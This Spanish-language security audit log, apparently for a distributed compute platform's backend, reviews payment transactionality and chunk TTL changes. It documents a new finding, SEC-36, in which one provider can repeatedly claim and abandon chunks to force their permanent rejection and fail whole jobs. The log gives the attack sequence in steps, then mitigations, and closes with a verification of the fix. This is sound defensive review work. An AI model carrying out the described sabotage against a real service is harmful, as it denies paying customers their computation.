2. **Si se decide conservar el WIP de backend (Opción B del Reviewer) en vez de revertirlo (Opción A):** aplicar también SEC-33 (eliminar `supabase_client.py`, usar `get_supabase()` en `task_queries.py`) y SEC-34 (sustituir los tres `print()` por `logger.exception(...)` + re-raise) como parte del mismo fix — no como tareas separadas. Ambos ya quedan resueltos por el fix de fiabilidad que ya recomendó el Reviewer para R3-CRIT-01/R3-MAYOR-01/R3-MAYOR-02.

3. **Independientemente de qué opción se elija para el WIP:** si `SUPABASE_DB_URL` se marca como variable de entorno en Railway, márquela explícitamente como **requerida** (no solo documentada en `DEPLOY.md`) — el fail-fast de `pydantic-settings` ya no puede ser la única red de seguridad para este campo mientras exista cualquier build en el árbol de trabajo que lo declare `Optional`. Esto cubre también el hallazgo nuevo de esta sección: el camino de pago a proveedores (`wallet_queries.py`) depende de la misma variable y no estaba mencionado explícitamente en el checklist de riesgo original.

4. **Hardening de bajo costo, no bloqueante, para cuando se toque `config.py` de nuevo:** envolver `supabase_service_role_key` y `jwt_secret_key` con `pydantic.SecretStr` en vez de `str` (SEC-33). No es specific de este ciclo, pero este ciclo es la ocasión en la que más se ha hablado de ese campo.

5. **Nada más requiere acción de DevOps derivada específicamente de este ciclo.** El resto de acciones pendientes (rate limiting, JWT en cookie, cuenta demo, rotación de `backend/.env`, etc.) ya están en los handoffs de las secciones anteriores de este mismo documento y no han cambiado.

---

## Auditoría — Pagos transaccionales de recompensa (`credit_reward_and_update_trust`) + TTL de asignación de chunks — 2026-07-07

**Alcance de este ciclo:** `backend/app/db/queries/wallet_queries.py` (nueva `credit_reward_and_update_trust`), `backend/app/db/queries/compute_queries.py` (`claim_chunks_atomic` reescrita), `backend/app/services/consensus_service.py`, `backend/app/routers/work.py`, `migrations/006_chunk_ttl.sql`, `backend/app/models/compute.py`, `backend/app/routers/auth.py` (para evaluar coste de creación de cuentas). Diseño de referencia: `docs/04-arquitectura.md` §14.

### 1. Inyección SQL — sin hallazgos

Revisadas línea por línea todas las sentencias nuevas o modificadas en `wallet_queries.py` y `compute_queries.py` (incluida `make_interval(mins => %(ttl_minutes)s)` en `claim_chunks_atomic`, y las tres sentencias secuenciales del reclamo TTL/rechazo/claim). Todas usan parámetros nombrados (`%(nombre)s`) o posicionales (`%s`) de psycopg2; ninguna interpola valores en el texto SQL con f-strings, `.format()` ni concatenación. `grep` dirigido sobre `backend/app/db/queries/` de los patrones `f"""`, `f'`, `.format(`, `sql +`, `+ sql` no encontró coincidencias. Los nombres de tabla/columna nuevos (`assigned_at`, `chunks`) están hardcodeados en el propio código fuente, no derivados de entrada de usuario. **Confirmado: ningún vector de inyección SQL en el código de este ciclo.**

### 2. Integridad de fondos — `credit_reward_and_update_trust` — resuelve SEC-24

**Verificado que el `FOR UPDATE` sí cierra la ventana de carrera descrita en SEC-24.** La secuencia es: `SELECT ... FROM providers WHERE id = %s FOR UPDATE` bloquea la fila del proveedor hasta el `COMMIT`; si dos submits del mismo proveedor (dos chunks distintos) llegan casi simultáneamente, la segunda transacción psycopg2 se bloquea en el `SELECT FOR UPDATE` hasta que la primera termine, y entonces relee `accuracy`/`trust_score` ya actualizados — sin lost update. Además, el crédito a `wallets.available_balance` sigue usando `available_balance = available_balance + %s` (incremento atómico a nivel de fila, seguro frente a concurrencia con o sin lock explícito, a diferencia del patrón read-modify-write en Python de SEC-01/SEC-24 original). **SEC-24 pasa a RESUELTO.**

**Doble pago por el mismo chunk: no es posible, verificado a nivel de esquema y de máquina de estados, no solo de código de aplicación:**
- `chunk_results` tiene `CONSTRAINT chunk_results_chunk_provider_unique UNIQUE (chunk_id, provider_id)` (`migrations/004_compute.sql:163`). Si dos peticiones concurrentes idénticas del mismo proveedor al mismo `POST /work/{chunk_id}/submit` superan a la vez la comprobación `already_submitted` en Python (TOCTOU — ambas leen `existing_results` antes de que la otra confirme su INSERT), la constraint UNIQUE de la base de datos rechaza el segundo INSERT con `IntegrityError`. Este camino cae en el `except Exception` genérico de `process_chunk_submission` y devuelve `500` en vez de un `409` limpio (defecto de UX/observabilidad, no de seguridad — no hay doble pago porque solo un INSERT llega a comprometerse).
- La máquina de estados de `chunks` (`status` solo puede ser `'assigned'` para un único `assigned_to` a la vez) impide que dos proveedores distintos tengan el mismo chunk `assigned` simultáneamente: el segundo proveedor solo puede reclamarlo después de que el primero lo devuelva explícitamente a `pending` dentro de su propia petición (tras insertar su propio resultado). Por tanto, el bucle `for r in all_results: _pay_and_update_trust(...)` en `consensus_service.py` (líneas 198-199, 231-236, 252-253) solo se ejecuta una vez por chunk en la práctica — no encontré una secuencia de eventos concurrentes que lo dispare dos veces para el mismo conjunto de resultados.

**`reward_amount` y `description`: no manipulables desde el cliente.** Trazada la cadena completa `POST /work/{chunk_id}/submit` (`work.py:45-60`) → `consensus_service.process_chunk_submission` → `consensus_service._pay_and_update_trust` (línea 40-54) → `wallet_queries.credit_reward_and_update_trust`. `reward_amount` siempre es la constante de servidor `REWARD_PER_CHUNK = 0.10` (definida igual en `consensus_service.py:27` y `compute_queries.py:22` — nota: duplicada en dos módulos, riesgo de que diverjan si se edita una sin la otra, hallazgo menor de mantenibilidad, no de seguridad). `description` se construye server-side como `f"Recompensa por chunk validado: {chunk_id}"`, donde `chunk_id` proviene del path param tipado `UUID` en FastAPI (`work.py:47`, valida formato antes de llegar al router). El body de la petición (`SubmitRequest`: `result: dict[str, Any]`, `duration_ms: int`) no tiene ningún campo que llegue a `reward_amount` ni a `description`. **Confirmado: el cliente no controla ni el importe ni la descripción de la transacción.**

**Nota residual (ya documentada, no nueva):** si `credit_reward_and_update_trust` falla para uno de los proveedores dentro del bucle de `_pay_and_update_trust`, el `except Exception` interno solo registra el error ("requiere reconciliación manual") sin reintento ni compensación — puede dejar a un proveedor sin cobrar un chunk válido. Es una decisión de alcance deliberada y ya documentada en `docs/04-arquitectura.md` §14.4.3; se deja constancia aquí porque toca el mismo camino de pago, pero no es un hallazgo nuevo.

### 3. TTL de chunks — resuelve SEC-22, pero abre un hallazgo nuevo (SEC-36)

**Liberación prematura de chunks ajenos: no es explotable.** La condición `assigned_at < now() - make_interval(mins => %(ttl_minutes)s)` depende del reloj del servidor de base de datos y de una constante fija (`CHUNK_ASSIGNMENT_TTL_MINUTES = 10`, hardcodeada en `compute_queries.py`, no configurable por parámetro de petición). Ningún campo de `ClaimRequest` ni de `SubmitRequest` influye en el TTL ni en el `assigned_at` de otro proveedor. **Confirmado: un proveedor no puede forzar la liberación anticipada de chunks asignados a terceros.** Esto resuelve el vector "chunks huérfanos permanentes" de **SEC-22 → RESUELTO** (el propio mecanismo de reclamo perezoso, activado en cada llamada a `/work/claim`, sustituye la necesidad del cron/función de mantenimiento que SEC-22 recomendaba).

**Acaparamiento vía reclamo-y-abandono repetido del mismo chunk: SÍ es explotable — y este ciclo lo empeora respecto al estado anterior.** El propio diseño (`docs/04-arquitectura.md` §14.0.2 y §14.2.5) reconoce explícitamente que el rechazo por `attempts >= MAX_CHUNK_ATTEMPTS` (lógica preexistente) era "casi inalcanzable en la práctica" porque, sin TTL, nada devolvía un chunk `assigned` a `pending` salvo el propio flujo de consenso. Activar el TTL hace que esa lógica de rechazo sea alcanzable **por un único proveedor actuando solo**, sin necesidad de Sybil (a diferencia de SEC-23):

1. El CTE `candidates` de `claim_chunks_atomic` (líneas 244-257) solo excluye, vía `NOT EXISTS (SELECT 1 FROM chunk_results cr WHERE cr.chunk_id = c.id AND cr.provider_id = %(provider_id)s)`, los chunks para los que el proveedor **ya entregó un resultado**. No excluye chunks que el mismo proveedor reclamó previamente y abandonó sin entregar nada.
2. Un proveedor P reclama un chunk C (`attempts` 0→1). No entrega resultado. A los 10 minutos, la siguiente llamada de cualquiera a `/work/claim` ejecuta la sentencia 1 (reclamo TTL) y devuelve C a `pending` sin tocar `attempts`.
3. P vuelve a reclamar el mismo C (nada se lo impide — el `NOT EXISTS` solo mira `chunk_results`, no historial de asignaciones). `attempts` pasa a 2. Repite el ciclo.
4. Tras 5 ciclos (~50 minutos, un único proveedor, sin paralelismo ni scripting sofisticado — un simple temporizador que llama a `/work/claim` cada 10 minutos), la sentencia 2 de `claim_chunks_atomic` (rechazo por `attempts >= 5`) marca C como `rejected` de forma permanente. Con `max_chunks` hasta 10 (`ClaimRequest.max_chunks`, `models/compute.py:60`), P puede aplicar esto en paralelo a hasta 10 chunks del mismo job por ciclo, y `_try_close_job` marca el job entero como `failed` si más del 50% de sus chunks quedan `rejected` (`consensus_service.py:77-84`) — es decir, un job pequeño-mediano puede sabotearse por completo en menos de una hora.
5. **Sin penalización de ningún tipo:** `credit_reward_and_update_trust` (y por tanto cualquier actualización de `accuracy`/`trust_score`) solo se invoca desde `_pay_and_update_trust`, que solo se llama cuando existe un resultado a validar. Un chunk abandonado vía expiración de TTL nunca genera un `chunk_result`, así que nunca pasa por esa función: el `accuracy` y `trust_score` del proveedor P quedan intactos pase lo que pase. El único rastro es un `logger.warning` (`compute_queries.py:217-222`), invisible para el cliente afectado y no vinculado a ningún sistema de alertas.
6. **Registrar una cuenta nueva es gratuito y no verificado:** `POST /auth/register` (`routers/auth.py:19-51`) no exige verificación de email, CAPTCHA ni límite de tasa (consistente con SEC-02/SEC-21, ya documentados). Esto abarata aún más el ataque: no hace falta ni siquiera reutilizar la cuenta atacada por el reclamo-y-abandono repetidas veces si se prefiere repartir el histórico de `attempts` — aunque, de hecho, ni eso es necesario, porque `attempts` es un contador por chunk, no por proveedor, así que una sola cuenta basta.

**Esto es un hallazgo nuevo — no es el mismo ángulo que SEC-21.** La mitigación que SEC-21 propone (rate limiting por frecuencia de llamadas, p. ej. `30/minuto` por `provider_id`) **no bloquea este ataque**, porque el atacante no necesita llamar con frecuencia — le basta una llamada cada 10 minutos por ciclo de TTL. Un rate limit de frecuencia y este hallazgo son ortogonales y ambos deben implementarse.

---

### SEC-36 — Reclamo-y-abandono repetido del mismo chunk por un único proveedor fuerza su rechazo permanente sin penalización

**Severidad: ALTO**
**CWE:** CWE-400 (Uncontrolled Resource Consumption), CWE-841 (Improper Enforcement of Behavioral Workflow)
**Archivos:**
- `backend/app/db/queries/compute_queries.py` líneas 169-304 (`claim_chunks_atomic`, CTE `candidates` línea 244-257; rechazo por intentos línea 224-239)
- `backend/app/services/consensus_service.py` líneas 40-54 (`_pay_and_update_trust`, nunca invocada para chunks abandonados vía TTL)
- `migrations/006_chunk_ttl.sql` (activa el mecanismo que hace explotable el rechazo por intentos)

**Descripción:** ver análisis completo en la sección "3. TTL de chunks" de arriba. En resumen: el reclamo perezoso por TTL, combinado con la falta de exclusión de "chunks previamente abandonados por este mismo proveedor" en el CTE de candidatos, permite que un único proveedor autenticado (registro gratuito, sin verificación) fuerce el rechazo permanente de cualquier chunk objetivo —y por extensión el fallo de jobs enteros con >50% de chunks rechazados— en ciclos de ~10 minutos, sin coste, sin necesidad de Sybil, y sin ninguna penalización de `trust_score`/`accuracy` porque el camino de penalización solo se dispara para resultados efectivamente entregados.

**Impacto:** denegación de servicio dirigida contra jobs específicos de clientes de la plataforma (sabotaje de cómputo). Reputacionalmente indistinguible de un fallo legítimo de consenso (3 resultados distintos) para quien revise `chunks.status = 'rejected'` sin mirar `chunk_results` — el patrón de ataque no deja resultados fraudulentos que un revisor pueda inspeccionar, solo ausencia de resultados.

**Mitigación concreta (ninguna requiere revertir el diseño de este ciclo, todas son incrementales):**
1. Excluir de `candidates` los chunks donde el propio proveedor los tuvo `assigned` y fueron reclamados por TTL sin resultado — requiere conservar un pequeño historial (columna `last_abandoned_by uuid` + `last_abandoned_at` en `chunks`, actualizada por la sentencia 1 de `claim_chunks_atomic`, y añadir `AND c.id NOT IN (chunks recientemente abandonados por %(provider_id)s)` al CTE), o más simple: un cooldown de N minutos antes de que el mismo `provider_id` pueda volver a reclamar un chunk que él mismo dejó expirar.
2. Tratar el reclamo por TTL como un fallo implícito de completion/accuracy para el proveedor que lo abandonó — invocar una variante de `update_accuracy_on_fail` (o un nuevo componente de `completion_rate`) en la sentencia 1 de `claim_chunks_atomic`, simétrico a como ya se penaliza un resultado inválido. Esto crea un coste reputacional real por abandonar chunks, hoy inexistente.
3. Implementar igualmente SEC-21 (rate limiting por frecuencia) como defensa en profundidad — no resuelve este hallazgo por sí solo (ver nota de ortogonalidad arriba) pero sigue siendo necesario para el acaparamiento por volumen que SEC-21 ya describe.
4. Alertar (no solo `logger.warning`) cuando el mismo `provider_id` protagonice reclamos-TTL repetidos sobre chunks del mismo `job_id` — señal de abuso barata de detectar con una consulta agregada sobre logs o sobre una futura tabla de auditoría.

**Estado actual:** NUEVO — introducido en su forma explotable por la activación del TTL en este ciclo (la lógica de rechazo por intentos ya existía, pero el propio diseño la calificaba de "casi inalcanzable"; con el TTL activo, es plenamente alcanzable por un solo actor). No bloqueante para el objetivo específico de este ciclo (transaccionalidad de pago + liberación de chunks huérfanos, ambos resueltos correctamente — ver SEC-22/SEC-24 arriba), pero sí debe entrar en el backlog de seguridad con prioridad ALTA antes de que la plataforma opere con clientes/jobs de valor real, dado que es más barato de explotar que SEC-21/SEC-23 (no requiere ni frecuencia de llamadas ni múltiples cuentas).

### 4. Migración `migrations/006_chunk_ttl.sql` — sin hallazgos

Contenido íntegro revisado: añade `chunks.assigned_at timestamptz` (nullable, sin default distinto de NULL) y `CREATE INDEX ... idx_chunks_assigned_at ON chunks (assigned_at) WHERE status = 'assigned'` (índice parcial). No añade columnas con datos personales, credenciales, ni ningún dato de negocio del cliente; no modifica ninguna política RLS; es idempotente (`ADD COLUMN IF NOT EXISTS`, `CREATE INDEX IF NOT EXISTS`), consistente con el estilo de `004_compute.sql`/`005_client.sql`. **Confirmado: la migración no introduce ninguna exposición de datos sensibles.**

### Resumen ejecutivo de esta sección

| ID | Severidad | Título | Estado |
|----|-----------|--------|--------|
| SEC-22 | ALTO | Sin timeout de chunks asignados | **RESUELTO** este ciclo (reclamo perezoso por TTL) |
| SEC-24 | ALTO | Race condition en pago de recompensas por chunk | **RESUELTO** este ciclo (`FOR UPDATE` + incremento atómico, transaccional) |
| SEC-36 | ALTO | Reclamo-y-abandono repetido fuerza rechazo permanente de chunks sin penalización | **NUEVO** — introducido (en forma explotable) por este ciclo |
| SEC-21 | ALTO | Sin rate limiting en `/work/claim` | **SIN CAMBIOS — sigue PENDIENTE** (y no mitiga SEC-36) |
| SEC-23 | ALTO | Sybil attack en consenso | **SIN CAMBIOS — sigue PENDIENTE** |

### Handoff para DevOps / usuario

**No bloqueante para el objetivo específico de este ciclo** (transaccionalidad de pago y liberación de chunks huérfanos): ambos problemas que motivaron el cambio quedan correctamente resueltos, con verificación a nivel de esquema (constraint UNIQUE, `FOR UPDATE`, incremento atómico) y no solo de lectura de código.

**Sí requiere decisión antes de operar con clientes/jobs de valor económico real:**
1. **SEC-36 (nuevo, ALTO):** priorizar junto con SEC-21 y SEC-23 — los tres comparten la misma causa raíz de fondo (`/work/claim` sin ningún control de identidad/comportamiento por proveedor más allá del JWT) y probablemente conviene resolverlos en el mismo esfuerzo de diseño en vez de por separado. Mitigación mínima recomendada: exclusión de auto-reclamo tras abandono (mitigación 1 de SEC-36) + penalización de `accuracy` en el reclamo TTL (mitigación 2). Ninguna requiere revertir el trabajo de este ciclo.
2. **SEC-21 (sin cambios, ALTO):** sigue pendiente. Recordar que su mitigación propuesta (rate limit por frecuencia) no cubre SEC-36 — son gastos de ingeniería distintos, no intercambiables.
3. **SEC-22 y SEC-24:** no requieren ninguna acción adicional — verificados como resueltos con evidencia de esquema, no solo de código de aplicación. Pueden marcarse como cerrados en el checklist de despliegue.
4. **Ningún hallazgo de esta sección exige revertir ni pausar el despliegue de `migrations/006_chunk_ttl.sql`** (ya aplicada a producción según el enunciado de este ciclo) — la migración en sí está limpia; el riesgo vive en la lógica de aplicación (`claim_chunks_atomic`), no en el esquema.

## Verificación de cierre — SEC-36 (mitigación de reclamo-y-abandono repetido) — 2026-07-08

Verificación puntual, no una auditoría nueva, sobre la mitigación que el Backend Dev implementó para SEC-36 (sección anterior, 2026-07-07): `migrations/007_chunk_abandon_tracking.sql` (columna `chunks.abandoned_by uuid[]`, ya aplicada a producción) + cambios en `claim_chunks_atomic` (`backend/app/db/queries/compute_queries.py` líneas 169-324). Leí el código actual directamente, no el resumen del Backend Dev.

**1. ¿Cierra el hueco?** Sí, para el vector que hacía a SEC-36 explotable por un único actor sin Sybil. La sentencia 1 (reclamo TTL, líneas 212-233) ahora añade `assigned_to` a `abandoned_by` cuando un chunk `assigned` expira, con un `CASE` que evita duplicados (`WHEN chunks.assigned_to = ANY(chunks.abandoned_by) THEN chunks.abandoned_by ELSE chunks.abandoned_by || chunks.assigned_to`). La sentencia 3 (claim, líneas 261-297) añade `AND NOT (%(provider_id)s = ANY(c.abandoned_by))` al CTE `candidates`, junto al `NOT EXISTS` sobre `chunk_results` que ya existía. Con esto, un proveedor que abandonó el chunk C ya no puede volver a reclamar ESE C — como mucho contribuye una vez a su contador `attempts`, así que ya no puede por sí solo llevarlo a `MAX_CHUNK_ATTEMPTS = 5` y forzar su `rejected` permanente. Confirmé además que la exclusión no depende de que el propio abandonador vuelva a llamar al endpoint: la sentencia 1 barre TODOS los chunks `assigned` expirados en cada llamada de CUALQUIER proveedor, así que el registro en `abandoned_by` ocurre aunque quien complete el barrido sea otro proveedor. También confirmé, leyendo la sentencia 3 completa, que la exclusión es específica del chunk (`c.id` dentro del mismo CTE), no global por proveedor: un proveedor que abandonó C puede seguir reclamando cualquier otro chunk `pending` con total normalidad — es el comportamiento pedido, no una restricción excesiva.

**2. ¿Hay forma de evadirlo?** La única evasión que encontré es registrar una cuenta nueva (nuevo `provider_id`, no presente en `abandoned_by` de ningún chunk) — eso es exactamente el riesgo Sybil ya documentado en SEC-23, no un hallazgo nuevo. Confirmo que sigue **igual de vigente que antes, no peor**: `attempts` sigue siendo un contador por chunk (no por proveedor), así que en teoría 5 cuentas distintas (o una cuenta reciclada mediante registro gratuito sin verificación, `POST /auth/register`) podrían repartirse el abandono de un mismo chunk hasta agotar `MAX_CHUNK_ATTEMPTS`. Pero eso ya requiere exactamente el mismo esfuerzo/Sybil que SEC-23 describe para el consenso — la mitigación de SEC-36 no lo agrava ni lo mitiga, simplemente lo deja donde SEC-23 ya lo tenía. No repito SEC-23 como hallazgo nuevo aquí.

**Nota de alcance — mitigación 2 no aplicada:** la sección anterior recomendaba dos mitigaciones para SEC-36 (ver línea 1732 arriba): (1) exclusión de auto-reclamo tras abandono — **esta es la que se implementó y verifiqué arriba** — y (2) penalizar `accuracy`/`completion_rate` del proveedor en el propio reclamo TTL. La (2) **no está implementada**: la sentencia 1 solo toca `status`, `assigned_to`, `assigned_at` y `abandoned_by`; no invoca ningún camino de `trust_score`/`accuracy`, y `_pay_and_update_trust` (`consensus_service.py`) sigue sin dispararse para chunks abandonados vía TTL. Esto no reabre el vector que hacía ALTO a SEC-36 (que era la capacidad de un actor único, sin Sybil, de forzar un rechazo permanente barato) — ese vector queda cerrado por la mitigación (1) — pero significa que abandonar un chunk sigue sin costar nada en reputación, algo relevante solo en escenarios ya cubiertos por SEC-23/SEC-21 (Sybil, volumen). Recomiendo mantener la mitigación 2 en el backlog como hardening de defensa en profundidad, sin bloquear por ello el cierre de SEC-36.

**3. Test nuevo.** `backend/tests/test_integration_reliability_v3.py::test_sec36_provider_who_abandoned_chunk_cannot_reclaim_it_but_can_claim_others` (líneas 243-371) sí verifica lo que dice verificar, contra Postgres real (no mocks): crea un chunk `assigned` a `provider_a` con `assigned_at` expirado y un segundo chunk `pending` normal en el mismo job, llama `claim_chunks_atomic(provider_a, ...)` y confirma (a) el chunk abandonado NO aparece en lo reclamado por `provider_a`, (b) el otro chunk SÍ se reclama con normalidad, (c) el chunk abandonado queda `pending`/`assigned_to = NULL` con `provider_a` presente en `abandoned_by`, y (d) un `provider_b` distinto SÍ puede reclamar ese mismo chunk abandonado sin restricción. Cubre los tres ángulos relevantes (exclusión, no sobre-restricción, alcance por-chunk no por-proveedor). Como el resto del módulo, se salta (no falla) si `SUPABASE_DB_URL` no está accesible o si las migraciones 006/007 no están aplicadas en la BD apuntada — no verifiqué la ejecución real contra una BD viva en este ciclo, solo la corrección de la lógica de aserciones leyendo el código del test.

**Conclusión — SEC-36: RESUELTO.** La mitigación implementada (exclusión de auto-reclamo vía `abandoned_by`) cierra específicamente el vector que hacía ALTO a este hallazgo: un único proveedor, sin Sybil, ya no puede forzar el rechazo permanente de un chunk mediante reclamo-y-abandono repetido del mismo chunk. El riesgo residual de que múltiples cuentas (Sybil) repartan el abandono de un mismo chunk, y el hecho de que abandonar siga sin penalizar `accuracy`/`trust_score` (mitigación 2, no aplicada), quedan correctamente subsumidos en SEC-23 (Sybil attack en consenso, ALTO, sigue PENDIENTE) — no constituyen una reapertura de SEC-36 ni ameritan un ID nuevo.
